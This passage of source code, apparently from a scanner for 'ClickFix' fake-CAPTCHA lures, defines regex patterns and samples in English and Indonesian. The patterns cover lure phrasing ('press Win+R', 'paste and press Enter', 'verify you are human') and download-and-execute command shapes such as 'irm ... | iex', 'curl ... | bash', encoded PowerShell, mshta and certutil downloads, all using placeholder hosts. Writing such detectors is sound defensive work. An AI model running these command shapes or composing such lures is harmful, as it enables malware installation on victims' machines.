      `${B}paste\\s+(?:the\\s+|this\\s+|that\\s+|your\\s+)?(?:copied\\s+)?(?:code|command|text|script|content|line|verification\\s+(?:code|string|text)|it)${E}`,
      ["Paste the code", "paste it", "paste the copied command"]
    ),
    entry(
      "en.paste.into",
      "A.PASTE",
      "en",
      "strong",
      `${B}paste\\s+(?:it\\s+|them\\s+)?(?:into|in)\\s+(?:the\\s+|a\\s+)?(?:box|window|dialog|terminal|powershell|run|field|prompt|command\\s+prompt)${E}`,
      ["paste into the Run box", "paste it in the terminal"]
    ),
    entry(
      "en.paste.copy_and_paste",
      "A.PASTE",
      "en",
      "weak",
      `${B}copy\\s*(?:and|&|\\+)\\s*paste${E}`,
      ["copy and paste", "Copy & Paste"]
    ),
    entry(
      "en.paste.right_click",
      "A.PASTE",
      "en",
      "strong",
      `${B}right[\\s-]?click\\s+(?:to\\s+|and\\s+(?:select\\s+|choose\\s+)?)paste${E}`,
      ["right-click to paste", "right click and select paste"]
    ),
    entry(
      "en.paste.from_clipboard",
      "A.PASTE",
      "en",
      "weak",
      `${B}(?:from|in)\\s+(?:your\\s+|the\\s+)?clipboard${E}`,
      ["what is in your clipboard", "from the clipboard"]
    ),
    // A.EXECUTE
    entry(
      "en.exec.press_enter",
      "A.EXECUTE",
      "en",
      "strong",
      `${B}(?:press|hit|tap|push)\\s+(?:the\\s+)?(?:enter|return)(?:\\s+key)?${E}`,
      ["press Enter", "hit the Return key"]
    ),
    entry(
      "en.exec.click_ok",
      "A.EXECUTE",
      "en",
      "weak",
      `${B}(?:click|press|select)\\s+(?:on\\s+)?(?:the\\s+)?${QUOTE}ok${QUOTE}(?:\\s+button)?${E}`,
      ["click OK", 'press the "OK" button']
    ),
    entry(
      "en.exec.run_it",
      "A.EXECUTE",
      "en",
      "strong",
      `${B}(?:run|execute)\\s+(?:it|(?:the|this|that)\\s+(?:command|code|script|line)s?)${E}`,
      ["run the command", "execute it"]
    ),
    entry(
      "en.exec.enter_key",
      "A.EXECUTE",
      "en",
      "weak",
      `${B}(?:the\\s+)?enter\\s+key${E}`,
      ["the Enter key"]
    ),
    entry(
      "en.exec.then_enter",
      "A.EXECUTE",
      "en",
      "strong",
      `${B}(?:then|and)\\s+(?:enter|return)${E}`,
      ["Ctrl+V then Enter"]
    ),
    // A.COPY_TRIGGER (text instructing the reader to use a copy/verify control)
    entry(
      "en.copy.click_button",
      "A.COPY_TRIGGER",
      "en",
      "strong",
      `${B}(?:click|press|tap)\\s+(?:on\\s+)?(?:the\\s+)?${QUOTE}(?:copy|verify|i${APOS}?m\\s+not\\s+a\\s+robot|verification)${QUOTE}\\s+(?:button|checkbox|box)${E}`,
      ["click the Copy button", 'Click the "Verify" button']
    ),
    entry(
      "en.copy.copy_command",
      "A.COPY_TRIGGER",
      "en",
      "weak",
      `${B}copy\\s+(?:the\\s+|this\\s+)?(?:code|command|script|text)\\s+(?:below|above)${E}`,
      ["copy the command below"]
    ),
    // P.HUMAN_VERIFY (strong pretext)
    entry(
      "en.verify.human",
      "P.HUMAN_VERIFY",
      "en",
      "strong",
      `${B}(?:verify|confirm|prove)\\s+(?:that\\s+)?you(?:${APOS}re|\\s+are)\\s+(?:a\\s+)?(?:human|not\\s+a\\s+(?:robot|bot))${E}`,
      ["Verify you are human", "prove you're not a robot"]
    ),
    entry(
      "en.verify.not_robot",
      "P.HUMAN_VERIFY",
      "en",
      "strong",
      `${B}i(?:\\s+am|${APOS}m)\\s+not\\s+a\\s+(?:robot|bot)${E}`,
      ["I'm not a robot", "I am not a robot"]
    ),
    entry(
      "en.verify.human_verification",
      "P.HUMAN_VERIFY",
      "en",
      "strong",
      `${B}(?:human|bot|robot|captcha)\\s+(?:verification|check|challenge|test)${E}`,
      ["Human verification", "CAPTCHA verification"]
    ),
    entry(
      "en.verify.verification_id",
      "P.HUMAN_VERIFY",
      "en",
      "strong",
      `${B}(?:verification|captcha)\\s+id\\s*[:#]`,
      ["Verification ID: 48213"]
    ),
    entry(
      "en.verify.complete_steps",
      "P.HUMAN_VERIFY",
      "en",
      "strong",
      `${B}(?:complete|pass|solve|finish)\\s+(?:the\\s+|this\\s+|these\\s+)?(?:captcha|recaptcha|verification\\s+(?:steps?|process|challenge))${E}`,
      ["Complete the CAPTCHA", "complete these verification steps"]
    ),
    // P.FAKE_FIX (weak pretext)
    entry(
      "en.fix.fix_error",
      "P.FAKE_FIX",
      "en",
      "weak",
      `${B}(?:fix|repair|resolve)\\s+(?:the\\s+|this\\s+|these\\s+)?(?:error|issue|problem)s?${E}`,
      ["fix this error", "resolve the issue"]
    ),
    entry(
      "en.fix.to_resolve",
      "P.FAKE_FIX",
      "en",
      "weak",
      `${B}to\\s+(?:fix|resolve|repair|correct)\\s+(?:this|it)${E}`,
      ["To fix this, follow the steps"]
    ),
    entry(
      "en.fix.update_required",
      "P.FAKE_FIX",
      "en",
      "weak",
      `${B}(?:browser|chrome|driver|font|plugin|software|system)\\s+(?:update|upgrade)\\s+(?:is\\s+)?(?:required|needed)${E}`,
      ["Browser update required"]
    ),
    entry(
      "en.fix.error_occurred",
      "P.FAKE_FIX",
      "en",
      "weak",
      `${B}(?:an\\s+)?(?:error|problem)\\s+(?:has\\s+)?occurred${E}`,
      ["An error has occurred"]
    ),
    entry(
      "en.fix.failed_display",
      "P.FAKE_FIX",
      "en",
      "weak",
      `${B}(?:failed|unable)\\s+to\\s+(?:load|display|render|show)${E}`,
      ["Failed to load the document"]
    ),
    entry(
      "en.fix.missing_component",
      "P.FAKE_FIX",
      "en",
      "weak",
      `${B}(?:font|plugin|codec)\\s+(?:was\\s+)?(?:not\\s+found|missing)${E}`,
      ["Font not found"]
    ),
    // P.URGENCY (weak pretext)
    entry(
      "en.urg.within",
      "P.URGENCY",
      "en",
      "weak",
      `${B}within\\s+(?:the\\s+next\\s+)?\\d+\\s+(?:hours?|minutes?|mins?)${E}`,
      ["within 24 hours"]
    ),
    entry(
      "en.urg.will_be_suspended",
      "P.URGENCY",
      "en",
      "weak",
      `${B}(?:account|access|device|computer|pc)\\s+(?:will|may)\\s+be\\s+(?:suspended|blocked|locked|deleted|terminated|disabled)${E}`,
      ["your account will be suspended"]
    ),
    entry(
      "en.urg.final_warning",
      "P.URGENCY",
      "en",
      "weak",
      `${B}(?:final|last)\\s+(?:warning|notice|chance)${E}`,
      ["Final warning"]
    ),
    entry(
      "en.urg.act_now",
      "P.URGENCY",
      "en",
      "weak",
      `${B}(?:act|respond)\\s+(?:now|immediately)${E}`,
      ["Act now"]
    ),
    // P.AUTHORITY (weak pretext)
    entry(
      "en.auth.vendor",
      "P.AUTHORITY",
      "en",
      "weak",
      `${B}(?:microsoft|windows|apple|google|cloudflare)\\s+(?:support|security|technician|verification|defender)(?:\\s+team)?${E}`,
      ["Microsoft Support", "Cloudflare verification"]
    ),
    entry(
      "en.auth.team",
      "P.AUTHORITY",
      "en",
      "weak",
      `${B}(?:security|it|technical\\s+support|support)\\s+(?:team|department)${E}`,
      ["the Security Team"]
    ),
    entry(
      "en.auth.official",
      "P.AUTHORITY",
      "en",
      "weak",
      `${B}official\\s+(?:support|verification|notice)${E}`,
      ["official verification"]
    ),
    // C.NEGATION cues (bound to actions by observe.ts)
    entry(
      "en.neg.cue",
      "C.NEGATION",
      "en",
      "strong",
      `${B}(?:never|do\\s+not|don${APOS}?t|must\\s+not|mustn${APOS}t|should\\s+not|shouldn${APOS}t|avoid)${E}(?!\\s+(?:ever\\s+)?(?:worry|hesitate|forget|panic|miss|wait)${E})`,
      ["Never", "don't", "do not"]
    ),
    // C.REPORTED cues
    entry(
      "en.rep.passive",
      "C.REPORTED",
      "en",
      "strong",
      `${B}(?:victims?|users?|visitors?|targets?|people|recipients?)\\s+(?:were|are|was|is|get|got|being)\\s+(?:told|instructed|asked|prompted|tricked|lured|urged|directed|encouraged)\\s+to${E}`,
      ["victims were instructed to"]
    ),
    entry(
      "en.rep.agent",
      "C.REPORTED",
      "en",
      "strong",
      `${B}(?:attackers?|scammers?|criminals?|hackers?|threat\\s+actors?|the\\s+(?:page|site|lure|campaign|message|pop-?up|fake\\s+[\\p{L}-]+))\\s+(?:instructs?|instructed|tells?|told|asks?|asked|prompts?|prompted|tricks?|tricked|urges?|urged|directs?|directed)${E}`,
      ["The attackers instructed", "the fake CAPTCHA tells"]
    ),
    entry(
      "en.rep.gerund",
      "C.REPORTED",
      "en",
      "strong",
      `${B}(?:instructing|telling|asking|prompting|tricking|urging)\\s+(?:users?|victims?|visitors?|people|them)\\s+to${E}`,
      ["tricking users to"]
    ),
    // C.EDUCATIONAL cues
    entry(
      "en.edu.how_to_spot",
      "C.EDUCATIONAL",
      "en",
      "strong",
      `${B}how\\s+to\\s+(?:spot|recognize|recognise|identify|avoid|detect)${E}`,
      ["How to spot"]
    ),
    entry(
      "en.edu.example_of",
      "C.EDUCATIONAL",
      "en",
      "strong",
      `${B}(?:example|sample)s?\\s+of\\s+(?:a\\s+|an\\s+|the\\s+)?(?:scam|phishing|attack|lure|clickfix|fake)${E}`,
      ["Example of a scam"]
    ),
    entry(
      "en.edu.warning_signs",
      "C.EDUCATIONAL",
      "en",
      "strong",
      `${B}(?:warning|tell-?tale)\\s+signs?${E}`,
      ["Warning signs"]
    ),
    entry("en.edu.red_flags", "C.EDUCATIONAL", "en", "strong", `${B}red\\s+flags?${E}`, ["red flags"]),
    entry(
      "en.edu.awareness",
      "C.EDUCATIONAL",
      "en",
      "strong",
      `${B}(?:security|safety)\\s+(?:awareness|tips?|advisory|guidance)${E}`,
      ["Security awareness"]
    ),
    entry(
      "en.edu.this_is_scam",
      "C.EDUCATIONAL",
      "en",
      "strong",
      `${B}(?:this|it)\\s+is\\s+(?:a\\s+)?(?:scam|phishing|an\\s+attack|malicious)${E}`,
      ["This is a scam"]
    )
  ];

  // src/core/lexicon/id.ts
  var OBJ = "(?:kode|perintah|teks|skrip|script|isi)(?:nya)?", ID2 = [
    // A.OPEN_RUN
    entry(
      "id.open.run_dialog",
      "A.OPEN_RUN",
      "id",
      "strong",
      `${B}buka\\s+(?:jendela\\s+|kotak\\s+(?:dialog\\s+)?|dialog\\s+|aplikasi\\s+)?run${E}`,
      ["Buka jendela Run", "buka kotak dialog Run"]
    ),
    entry(
      "id.open.shell",
      "A.OPEN_RUN",
      "id",
      "strong",
      `${B}(?:buka|jalankan|luncurkan)\\s+(?:aplikasi\\s+)?${SHELL}${E}`,
      ["Buka PowerShell", "jalankan Terminal", "buka aplikasi Command Prompt"]
    ),
    entry(
      "id.open.search_shell",
      "A.OPEN_RUN",
      "id",
      "strong",
      `${B}(?:cari|ketik(?:kan)?)\\s+${QUOTE}(?:powershell|terminal|cmd|command\\s+prompt)${E}`,
      ["Cari PowerShell", 'ketik "cmd"']
    ),
    entry(
      "id.open.right_click_start",
      "A.OPEN_RUN",
      "id",
      "strong",
      `${B}klik\\s+kanan\\s+(?:pada\\s+)?(?:tombol\\s+|menu\\s+|ikon\\s+|logo\\s+)?(?:start|windows)${E}`,
      ["Klik kanan tombol Start"]
    ),
    entry(
      "id.open.hold_win",
      "A.OPEN_RUN",
      "id",
      "weak",
      `${B}(?:tekan|tahan|pencet)\\s+(?:dan\\s+tahan\\s+)?${WIN}${E}`,
      ["Tekan dan tahan tombol Windows", "pencet tombol Windows"]
    ),
    // A.PASTE
    entry(
      "id.paste.object",
      "A.PASTE",
      "id",
      "strong",
      `${B}(?:tempel(?:kan)?|paste(?:kan)?)\\s+${OBJ}${E}`,
      ["Tempelkan kode", "paste perintahnya"]
    ),
    entry(
      "id.paste.into",
      "A.PASTE",
      "id",
      "strong",
      `${B}(?:tempel(?:kan)?|paste(?:kan)?)\\s+(?:[\\p{L}]+\\s+)?(?:ke|di)\\s+(?:dalam\\s+)?(?:kotak|jendela|terminal|powershell|run|kolom|dialog)${E}`,
      ["tempelkan ke kotak Run", "paste kode di jendela PowerShell"]
    ),
    entry(
      "id.paste.copas",
      "A.PASTE",
      "id",
      "weak",
      `${B}(?:copas|salin\\s*(?:dan|&|lalu)\\s*tempel|copy\\s*(?:dan|&)\\s*paste)${E}`,
      ["copas", "salin dan tempel"]
    ),
    entry(
      "id.paste.right_click",
      "A.PASTE",
      "id",
      "strong",
      `${B}klik\\s+kanan\\s+(?:lalu\\s+|untuk\\s+|dan\\s+)?(?:pilih\\s+)?(?:tempel|paste)${E}`,
      ["klik kanan lalu pilih Paste"]
    ),
    entry(
      "id.paste.clipboard",
      "A.PASTE",
      "id",
      "weak",
      `${B}(?:dari|di)\\s+(?:papan\\s+klip|clipboard)${E}`,
      ["dari clipboard", "di papan klip"]
    ),
    // A.EXECUTE
    entry(
      "id.exec.press_enter",
      "A.EXECUTE",
      "id",
      "strong",
      `${B}(?:tekan|pencet|klik|tap)\\s+(?:tombol\\s+)?(?:enter|return)${E}`,
      ["Tekan Enter", "pencet tombol Enter"]
    ),
    entry(
      "id.exec.click_ok",
      "A.EXECUTE",
      "id",
      "weak",
      `${B}(?:klik|tekan|pilih)\\s+(?:tombol\\s+)?${QUOTE}ok${QUOTE}${E}`,
      ["klik OK", 'tekan tombol "OK"']
    ),
    entry(
      "id.exec.run_command",
      "A.EXECUTE",
      "id",
      "strong",
      `${B}(?:jalankan|eksekusi)\\s+${OBJ}${E}`,
      ["jalankan perintah", "eksekusi kodenya"]
    ),
    entry(
      "id.exec.run_it",
      "A.EXECUTE",
      "id",
      "strong",
      `${B}(?:jalankan|eksekusi)(?:lah)?\\s+(?:itu|ini|tersebut)${E}`,
      ["jalankan ini"]
    ),
    entry(
      "id.exec.then_enter",
      "A.EXECUTE",
      "id",
      "strong",
      `${B}(?:lalu|kemudian|dan)\\s+(?:enter|tekan\\s+enter)${E}`,
      ["Ctrl+V lalu Enter"]
    ),
    // A.COPY_TRIGGER
    entry(
      "id.copy.click_button",
      "A.COPY_TRIGGER",
      "id",
      "strong",
      `${B}(?:klik|tekan|ketuk)\\s+(?:tombol|kotak)\\s+${QUOTE}(?:salin|copy|verifikasi|verify|saya\\s+bukan\\s+robot)${E}`,
      ["klik tombol Salin", 'Klik kotak "Saya bukan robot"']
    ),
    entry(
      "id.copy.copy_command",
      "A.COPY_TRIGGER",
      "id",
      "weak",
      `${B}salin\\s+${OBJ}(?:\\s+(?:di\\s+)?(?:bawah|atas)(?:\\s+ini)?)?${E}`,
      ["salin kode di bawah ini"]
    ),
    // P.HUMAN_VERIFY (strong pretext)
    entry(
      "id.verify.human",
      "P.HUMAN_VERIFY",
      "id",
      "strong",
      `${B}(?:verifikasi|konfirmasi|buktikan)\\s+(?:(?:dulu|dl|dong|ya)\\s+)?(?:bahwa\\s+)?(?:anda|kamu|km)\\s+(?:adalah\\s+)?(?:manusia|bukan\\s+(?:robot|bot))${E}`,
      ["Verifikasi bahwa Anda manusia", "buktikan Anda bukan robot", "Konfirmasi dulu kamu bukan robot"]
    ),
    entry(
      "id.verify.not_robot",
      "P.HUMAN_VERIFY",
      "id",
      "strong",
      `${B}(?:saya|aku)\\s+bukan\\s+(?:robot|bot)${E}`,
      ["Saya bukan robot"]
    ),
    entry(
      "id.verify.human_verification",
      "P.HUMAN_VERIFY",
      "id",
      "strong",
      `${B}verifikasi\\s+(?:manusia|captcha|keamanan|robot|bot)${E}`,
      ["Verifikasi manusia", "verifikasi keamanan"]
    ),
    entry(
      "id.verify.verification_id",
      "P.HUMAN_VERIFY",
      "id",
      "strong",
      `${B}id\\s+verifikasi\\s*[:#]`,
      ["ID Verifikasi: 4821"]
    ),
    entry(
      "id.verify.complete",
      "P.HUMAN_VERIFY",
      "id",
      "strong",
      `${B}(?:selesaikan|lengkapi|lanjutkan)\\s+(?:proses\\s+|langkah\\s+)?(?:verifikasi|captcha)${E}`,
      ["Selesaikan verifikasi", "lengkapi langkah verifikasi"]
    ),
    entry(
      "id.verify.steps",
      "P.HUMAN_VERIFY",
      "id",
      "strong",
      `${B}langkah(?:-langkah)?\\s+verifikasi${E}`,
      ["Langkah-langkah verifikasi"]
    ),
    // P.FAKE_FIX (weak pretext)
    entry(
      "id.fix.fix_error",
      "P.FAKE_FIX",
      "id",
      "weak",
      `${B}(?:perbaiki|atasi)\\s+(?:kesalahan|error|masalah|galat)${E}`,
      ["Perbaiki kesalahan"]
    ),
    entry(
      "id.fix.to_resolve",
      "P.FAKE_FIX",
      "id",
      "weak",
      `${B}untuk\\s+(?:mengatasi|memperbaiki|menyelesaikan)\\s+(?:masalah|kesalahan|error)${E}`,
      ["untuk mengatasi masalah ini"]
    ),
    entry(
      "id.fix.update_required",
      "P.FAKE_FIX",
      "id",
      "weak",
      `${B}(?:pembaruan|update)\\s+(?:browser|peramban|chrome|driver|font|sistem)(?:\\s+(?:diperlukan|dibutuhkan|wajib))?${E}`,
      ["Pembaruan browser diperlukan"]
    ),
    entry(
      "id.fix.error_occurred",
      "P.FAKE_FIX",
      "id",
      "weak",
      `${B}terjadi\\s+(?:kesalahan|error|galat|masalah)${E}`,
      ["Terjadi kesalahan"]
    ),
    entry(
      "id.fix.failed_load",
      "P.FAKE_FIX",
      "id",
      "weak",
      `${B}gagal\\s+(?:memuat|menampilkan|memutar)${E}`,
      ["Gagal memuat halaman"]
    ),
    entry(
      "id.fix.font_missing",
      "P.FAKE_FIX",
      "id",
      "weak",
      `${B}font\\s+tidak\\s+(?:ditemukan|tersedia)${E}`,
      ["Font tidak ditemukan"]
    ),
    // P.URGENCY (weak pretext)
    entry(
      "id.urg.within",
      "P.URGENCY",
      "id",
      "weak",
      `${B}dalam\\s+(?:waktu\\s+)?\\d+\\s+(?:jam|menit)${E}`,
      ["dalam 24 jam"]
    ),
    entry(
      "id.urg.will_be_blocked",
      "P.URGENCY",
      "id",
      "weak",
      `${B}(?:akun|akses|perangkat|komputer)(?:\\s+(?:anda|kamu))?\\s+akan\\s+(?:diblokir|dinonaktifkan|ditangguhkan|dihapus|dikunci)${E}`,
      ["Akun Anda akan diblokir"]
    ),
    entry(
      "id.urg.final_warning",
      "P.URGENCY",
      "id",
      "weak",
      `${B}(?:peringatan|kesempatan)\\s+terakhir${E}`,
      ["Peringatan terakhir"]
    ),
    entry(
      "id.urg.act_now",
      "P.URGENCY",
      "id",
      "weak",
      `${B}segera\\s+(?:lakukan|selesaikan|verifikasi|perbaiki)${E}`,
      ["Segera lakukan"]
    ),
    // P.AUTHORITY (weak pretext)
    entry(
      "id.auth.team",
      "P.AUTHORITY",
      "id",
      "weak",
      `${B}tim\\s+(?:keamanan|teknis|it|dukungan|support)${E}`,
      ["Tim Keamanan"]
    ),
    entry(
      "id.auth.official",
      "P.AUTHORITY",
      "id",
      "weak",
      `${B}(?:layanan|dukungan)\\s+(?:pelanggan|teknis)\\s+resmi${E}`,
      ["layanan pelanggan resmi"]
    ),
    entry(
      "id.auth.vendor",
      "P.AUTHORITY",
      "id",
      "weak",
      `${B}(?:tim|dukungan|layanan)\\s+(?:microsoft|windows|apple|google|cloudflare)${E}`,
      ["Tim Microsoft"]
    ),
    entry(
      "id.auth.officer",
      "P.AUTHORITY",
      "id",
      "weak",
      `${B}petugas\\s+(?:bank|resmi|keamanan)${E}`,
      ["petugas bank"]
    ),
    // C.NEGATION cues
    entry(
      "id.neg.cue",
      "C.NEGATION",
      "id",
      "strong",
      `${B}(?:jangan(?:lah)?(?:\\s+pernah|\\s+sekali-kali)?|tidak\\s+boleh|dilarang|hindari)${E}(?!\\s+(?:khawatir|ragu|lupa|panik|cemas|takut|tunggu)${E})`,
      ["Jangan pernah", "jangan", "dilarang"]
    ),
    // C.REPORTED cues
    entry(
      "id.rep.passive",
      "C.REPORTED",
      "id",
      "strong",
      `${B}(?:korban|pengguna|pengunjung|nasabah|mereka)\\s+(?:diminta|disuruh|diarahkan|diperintahkan|ditipu|dibujuk|diinstruksikan)${E}`,
      ["korban diminta"]
    ),
    entry(
      "id.rep.agent",
      "C.REPORTED",
      "id",
      "strong",
      `${B}(?:pelaku|penipu|penyerang|peretas|hacker|halaman\\s+palsu|situs\\s+palsu|modus\\s+ini)\\s+(?:meminta|menyuruh|mengarahkan|memerintahkan|menipu|membujuk|menginstruksikan)${E}`,
      ["Pelaku meminta", "halaman palsu menyuruh"]
    ),
    entry(
      "id.rep.object",
      "C.REPORTED",
      "id",
      "strong",
      `${B}(?:meminta|menyuruh|mengarahkan)\\s+(?:korban|pengguna|pengunjung|nasabah)${E}`,
      ["menyuruh korban"]
    ),
    // C.EDUCATIONAL cues
    entry(
      "id.edu.how_to",
      "C.EDUCATIONAL",
      "id",
      "strong",
      `${B}cara\\s+(?:mengenali|menghindari|mendeteksi|mengidentifikasi)${E}`,
      ["Cara mengenali"]
    ),
    entry(
      "id.edu.example_of",
      "C.EDUCATIONAL",
      "id",
      "strong",
      `${B}contoh\\s+(?:modus|penipuan|serangan|phishing)${E}`,
      ["Contoh modus"]
    ),
    entry(
      "id.edu.beware",
      "C.EDUCATIONAL",
      "id",
      "strong",
      `${B}waspada(?:i|lah)?\\s+(?:terhadap\\s+)?(?:modus|penipuan|serangan|phishing|scam)${E}`,
      ["Waspadai modus"]
    ),
    entry(
      "id.edu.scam_mode",
      "C.EDUCATIONAL",
      "id",
      "strong",
      `${B}modus\\s+(?:penipuan|baru|clickfix|kejahatan)${E}`,
      ["modus penipuan"]
    ),
    entry(
      "id.edu.signs",
      "C.EDUCATIONAL",
      "id",
      "strong",
      `${B}ciri-ciri\\s+(?:penipuan|phishing|situs\\s+palsu|modus)${E}`,
      ["Ciri-ciri penipuan"]
    ),
    entry("id.edu.tips", "C.EDUCATIONAL", "id", "strong", `${B}tips\\s+keamanan${E}`, ["Tips keamanan"])
  ];

  // src/core/lexicon/neutral.ts
  var NEUTRAL = [
    // A.OPEN_RUN
    entry(
      "any.open.combo_win_r",
      "A.OPEN_RUN",
      "any",
      "strong",
      `${B}${WIN}${SEP}r${E}`,
      ["Win+R", "Windows + R", "\u229E + R", "tombol Windows dan R", "Windows Key + R"]
    ),
    entry(
      "any.open.combo_win_x",
      "A.OPEN_RUN",
      "any",
      "strong",
      `${B}${WIN}${SEP}x${E}`,
      ["Win + X", "Windows+X"]
    ),
    entry(
      "any.open.combo_spotlight",
      "A.OPEN_RUN",
      "any",
      "strong",
      `${B}${CMD}${SEP}(?:space|spasi)${E}`,
      ["Cmd + Space", "\u2318 + Space", "Command+Spasi"]
    ),
    entry(
      "any.open.start_run",
      "A.OPEN_RUN",
      "any",
      "strong",
      `${B}start\\s*(?:>|\u2192|\xBB)\\s*run${E}`,
      ["Start > Run"]
    ),
    // A.PASTE
    entry(
      "any.paste.combo_ctrl_v",
      "A.PASTE",
      "any",
      "strong",
      `${B}${CTRL}${SEP}v${E}`,
      ["Ctrl+V", "CTRL + V", "Control V"]
    ),
    entry(
      "any.paste.combo_cmd_v",
      "A.PASTE",
      "any",
      "strong",
      `${B}${CMD}${SEP}v${E}`,
      ["\u2318+V", "Cmd + V"]
    ),
    entry(
      "any.paste.combo_shift_insert",
      "A.PASTE",
      "any",
      "strong",
      `${B}shift${SEP}(?:insert|ins)${E}`,
      ["Shift + Insert"]
    ),
    // A.EXECUTE
    entry(
      "any.exec.combo_ctrl_shift_enter",
      "A.EXECUTE",
      "any",
      "strong",
      `${B}${CTRL}${SEP}shift${SEP}enter${E}`,
      ["Ctrl + Shift + Enter"]
    ),
    // A.COMMAND, strong: execution / download-and-execute / encoded payload shapes
    entry(
      "any.cmd.ps_encoded",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:powershell|pwsh)(?:\\.exe)?${E}.{0,80}?\\s-(?:e|ec|enc|encodedcommand)\\s+[a-z0-9+/=]{16,}`,
      ["powershell -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi"]
    ),
    entry(
      "any.cmd.ps_hidden_window",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:powershell|pwsh)(?:\\.exe)?${E}.{0,40}?\\s-(?:w|win|window|windowstyle)\\s+(?:h|hidden|1)${E}`,
      ["powershell -w hidden -c calc", "PowerShell.exe -WindowStyle Hidden"]
    ),
    entry(
      "any.cmd.ps_iex_download",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:iex|invoke-expression)\\s*\\(?\\s*\\(?\\s*(?:new-object\\s+(?:system\\.)?net\\.webclient|iwr|irm|invoke-webrequest|invoke-restmethod)${E}`,
      ["iex (New-Object Net.WebClient).DownloadString('http://example.invalid/a')", "IEX(irm example.invalid)"]
    ),
    entry(
      "any.cmd.pipe_to_iex",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:iwr|irm|invoke-webrequest|invoke-restmethod|curl|wget)\\s[^|]{1,200}\\|\\s*(?:iex|invoke-expression)${E}`,
      ["irm https://example.invalid/x | iex"]
    ),
    entry(
      "any.cmd.mshta_remote",
      "A.COMMAND",
      "any",
      "strong",
      `${B}mshta(?:\\.exe)?\\s+["']?(?:https?:|\\\\\\\\|vbscript:|javascript:)`,
      ["mshta https://example.invalid/a.hta", 'mshta.exe "http://192.0.2.1/x"']
    ),
    entry(
      "any.cmd.lolbin_download",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:certutil(?:\\.exe)?\\s.{0,40}?-urlcache|bitsadmin(?:\\.exe)?\\s.{0,20}?/transfer|regsvr32(?:\\.exe)?\\s.{0,40}?/i:https?:|rundll32(?:\\.exe)?\\s.{0,20}?javascript:)`,
      ["certutil -urlcache -split -f http://example.invalid/a.exe", "bitsadmin /transfer job http://example.invalid/a"]
    ),
    entry(
      "any.cmd.curl_pipe_shell",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:curl|wget)\\s[^|]{1,200}\\|\\s*(?:sudo\\s+)?(?:ba|z|da)?sh${E}`,
      ["curl -fsSL https://example.invalid/i.sh | bash", "wget -qO- http://example.invalid/x | sh"]
    ),
    entry(
      "any.cmd.shell_substitution",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:ba|z)?sh\\s+-c\\s+["']?\\$\\(\\s*(?:curl|wget)${E}`,
      ['bash -c "$(curl -fsSL https://example.invalid/x)"']
    ),
    entry(
      "any.cmd.base64_to_shell",
      "A.COMMAND",
      "any",
      "strong",
      `${B}(?:echo|printf)\\s+["']?[a-z0-9+/=]{16,}["']?\\s*\\|\\s*base64\\s+(?:-d|--decode)[^|]{0,10}\\|\\s*(?:ba|z)?sh${E}`,
      ["echo 'Y3VybCBleGFtcGxlLmludmFsaWQ=' | base64 -d | bash"]
    ),
    entry(
      "any.cmd.osascript",
      "A.COMMAND",
      "any",
      "strong",
      `${B}osascript\\s+-e${E}`,
      [`osascript -e 'do shell script "x"'`]
    ),
    entry(
      "any.cmd.cmd_chain",
      "A.COMMAND",
      "any",
      "strong",
      `${B}cmd(?:\\.exe)?\\s+/[ck]\\s.{0,60}?(?:start\\s+/min|powershell|mshta|curl|certutil|bitsadmin)${E}`,
      ["cmd /c start /min powershell -c x", "cmd.exe /c curl http://example.invalid -o a.exe"]
    ),
    entry(
      "any.cmd.msiexec_remote",
      "A.COMMAND",
      "any",
      "strong",
      `${B}msiexec(?:\\.exe)?\\s.{0,20}?/(?:i|package)\\s+["']?https?:`,
      ["msiexec /q /i https://example.invalid/a.msi"]
    ),
    entry(
      "any.cmd.conhost_headless",
      "A.COMMAND",
      "any",
      "strong",
      `${B}conhost(?:\\.exe)?\\s+--headless${E}`,
      ["conhost.exe --headless powershell"]
    ),
    // A.COMMAND, weak: shell invocation without an execution/download shape (observation only)
    entry(
      "any.cmd.ps_invocation",
      "A.COMMAND",
      "any",
      "weak",
      `${B}(?:powershell|pwsh)(?:\\.exe)?\\s+-[a-z]+${E}`,
      ["powershell -NoProfile"]
    ),
    entry(
      "any.cmd.fetch_url",
      "A.COMMAND",
      "any",
      "weak",
      `${B}(?:curl|wget)\\s+(?:-[a-z]+\\s+)*https?:`,
      ["curl -O https://example.invalid/file.tar.gz"]
    )
  ];

  // src/core/lexicon/index.ts
  var LEXICON = [...NEUTRAL, ...EN2, ...ID2], SIGNALS = [
    { id: "A.OPEN_RUN", kind: "action", description: "Open the Run dialog, a terminal, PowerShell or a command prompt" },
    { id: "A.PASTE", kind: "action", description: "Paste clipboard content into that surface" },
    { id: "A.EXECUTE", kind: "action", description: "Confirm execution (Enter, OK, run the command)" },
    { id: "A.COMMAND", kind: "action", description: "A shell command is present (strong: execution/download/encoded shape)" },
    { id: "A.COPY_TRIGGER", kind: "action", description: "A control or instruction that copies text to the clipboard" },
    { id: "P.HUMAN_VERIFY", kind: "pretext", description: "Fake human/bot verification (strong pretext)" },
    { id: "P.FAKE_FIX", kind: "pretext", description: "Error, fix or update framing (weak pretext)" },
    { id: "P.URGENCY", kind: "pretext", description: "Deadline, loss or threat (weak pretext)" },
    { id: "P.AUTHORITY", kind: "pretext", description: "Claimed authority (weak pretext)" },
    { id: "C.NEGATION", kind: "context", description: "Negation cue bound to an action" },
    { id: "C.REPORTED", kind: "context", description: "Reported-speech cue: describes what someone else was told" },
    { id: "C.EDUCATIONAL", kind: "context", description: "Educational or awareness framing" }
  ], KIND_BY_SIGNAL = new Map(SIGNALS.map((s) => [s.id, s.kind]));
  function kindOf(signal) {
    return KIND_BY_SIGNAL.get(signal);
  }

  // src/core/normalize.ts
  var INVISIBLE = /* @__PURE__ */ new Set(["\u200B", "\u200C", "\u200D", "\u2060", "\uFEFF", "\xAD"]), CONFUSABLES = {
    // Cyrillic
    \u0430: "a",
    \u0435: "e",
    \u0456: "i",
    \u0458: "j",
    \u043A: "k",
    \u043E: "o",
    \u0440: "p",
    \u0441: "c",
    \u0455: "s",
    \u0443: "y",
    \u0445: "x",
    \u04BB: "h",
    "\u0501": "d",
    "\u051B": "q",
    "\u051D": "w",
    "\u04CF": "l",
    // Greek
    \u03B1: "a",
    \u03B9: "i",
    \u03BA: "k",
